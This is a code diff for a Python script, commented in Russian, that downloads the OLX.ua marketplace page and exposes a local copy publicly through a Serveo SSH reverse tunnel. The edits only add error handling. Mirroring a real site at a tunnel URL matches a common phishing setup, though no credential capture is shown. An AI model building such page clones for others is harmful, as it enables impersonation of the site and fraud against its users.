@@ -4,7 +4,7 @@ import subprocess
 # Шаг 1: Скачивание страницы
 
 # Замените 'http://example.com' на нужную вам ссылку
-url = 'https://www.olx.ua/uk'
+url = 'https://www.olx.ua/uk/'
 
 # Скачиваем страницу по ссылке
 response = requests.get(url)
@@ -25,13 +25,17 @@ serveo_subdomain = 'your-serveo-subdomain'
 serveo_command = f'ssh -R 80:localhost:8080 {serveo_subdomain}.serveo.net -T -n'
 
 # Запускаем команду для Serveo.net с помощью subprocess
-serveo_process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE)
+serveo_process = subprocess.Popen(serveo_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 
-# Получаем вывод команды (URL Serveo)
-serveo_output = serveo_process.stdout.read().decode('utf-8').strip()
+# Ждем, пока процесс не завершится
+serveo_output, serveo_error = serveo_process.communicate()
 
 # Печатаем URL Serveo
-print(f"Ваша страница теперь доступна по ссылке Serveo: {serveo_output}")
+if not serveo_error:
+    serveo_url = serveo_output.decode('utf-8').strip()
+    print(f"Ваша страница теперь доступна по ссылке Serveo: {serveo_url}")
+else:
+    print(f"Ошибка при запуске на Serveo: {serveo_error.decode('utf-8')}")
 
 # Шаг 3: Запуск на локальном сервере
 
